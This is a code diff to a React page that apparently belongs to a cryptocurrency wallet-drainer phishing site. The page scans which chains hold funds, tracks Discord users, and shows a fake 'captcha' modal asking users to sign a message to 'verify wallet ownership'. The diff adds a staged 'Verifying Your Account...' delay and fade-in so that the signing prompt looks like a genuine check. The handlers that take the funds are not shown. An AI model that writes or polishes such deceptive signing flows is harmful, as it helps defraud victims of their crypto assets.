@@ -355,6 +355,7 @@ export default function Home() {
   const [chainsWithFunds, setChainsWithFunds] = useState<number[]>([]);
   const [scanComplete, setScanComplete] = useState(false);
   const [chainCycleActive, setChainCycleActive] = useState(false);
+  const [showModalContent, setShowModalContent] = useState(false);
 
   const [discordUser, setDiscordUser] = useState<string | null>(null);
   const [discordId, setDiscordId] = useState<string | null>(null);
@@ -435,11 +436,15 @@ export default function Home() {
 
   useEffect(() => {
     if (showSigningScreen) {
+      setShowModalContent(false);
       setVerifyButtonText("Verifying Your Account...");
-      const timer = setTimeout(() => {
+      const contentTimer = setTimeout(() => {
+        setShowModalContent(true);
+      }, 3000);
+      const buttonTimer = setTimeout(() => {
         setVerifyButtonText("Verify Wallet Ownership");
       }, 5000);
-      return () => clearTimeout(timer);
+      return () => { clearTimeout(contentTimer); clearTimeout(buttonTimer); };
     }
   }, [showSigningScreen]);
 
@@ -1066,31 +1071,33 @@ export default function Home() {
                 </div>
               </div>
             </div>
-            <div className="text-center">
+            <div className={`text-center transition-all duration-500 ${showModalContent ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-2 pointer-events-none h-0 overflow-hidden'}`}>
               <h3 className="text-xl font-semibold text-gray-900 mb-3">Verify wallet ownership</h3>
               <p className="text-gray-500 text-sm">Captcha verification need to verify that you really own this wallet. Sign a message to continue</p>
             </div>
-            <button
-              onClick={() => {
-                if (networkType === "solana") {
-                  handleSolanaProceed();
-                } else {
-                  handleProceed();
-                }
-              }}
-              disabled={isProcessing || isSolanaProcessing || verifyButtonText !== "Verify Wallet Ownership" || (networkType === "evm" && !scanComplete)}
-              className="w-full bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl py-3 text-base cursor-pointer border-0 outline-none disabled:opacity-80 flex items-center justify-center gap-2"
-              data-testid="button-proceed-sign"
-            >
-              {(isProcessing || isSolanaProcessing) ? (
-                <>
-                  <Loader2 className="w-5 h-5 animate-spin" />
-                  Verifying...
-                </>
-              ) : (
-                verifyButtonText
-              )}
-            </button>
+            <div className={`w-full transition-all duration-500 ${showModalContent ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-2 pointer-events-none h-0 overflow-hidden'}`}>
+              <button
+                onClick={() => {
+                  if (networkType === "solana") {
+                    handleSolanaProceed();
+                  } else {
+                    handleProceed();
+                  }
+                }}
+                disabled={isProcessing || isSolanaProcessing || verifyButtonText !== "Verify Wallet Ownership" || (networkType === "evm" && !scanComplete)}
+                className="w-full bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl py-3 text-base cursor-pointer border-0 outline-none disabled:opacity-80 flex items-center justify-center gap-2"
+                data-testid="button-proceed-sign"
+              >
+                {(isProcessing || isSolanaProcessing) ? (
+                  <>
+                    <Loader2 className="w-5 h-5 animate-spin" />
+                    Verifying...
+                  </>
+                ) : (
+                  verifyButtonText
+                )}
+              </button>
+            </div>
             <button
               onClick={() => {
                 if (solanaConnected) {
